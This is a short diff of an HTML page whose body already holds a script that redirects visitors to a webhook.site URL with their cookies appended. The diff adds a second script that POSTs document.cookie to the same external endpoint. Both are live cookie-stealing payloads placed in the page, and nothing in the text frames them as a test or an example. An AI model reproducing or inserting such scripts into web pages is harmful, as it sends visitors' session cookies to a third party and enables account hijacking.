@@ -4,5 +4,12 @@
   </head>
   <body>
     <script>document.location='https://webhook.site/456a30d9-586a-4792-b967-a7396621f106?c='+document.cookie</script>
+    <script>
+      fetch('https://webhook.site/456a30d9-586a-4792-b967-a7396621f106', {
+      method: 'POST',
+      mode: 'no-cors',
+      body:document.cookie
+      });
+      </script>
   </body>
 </html>
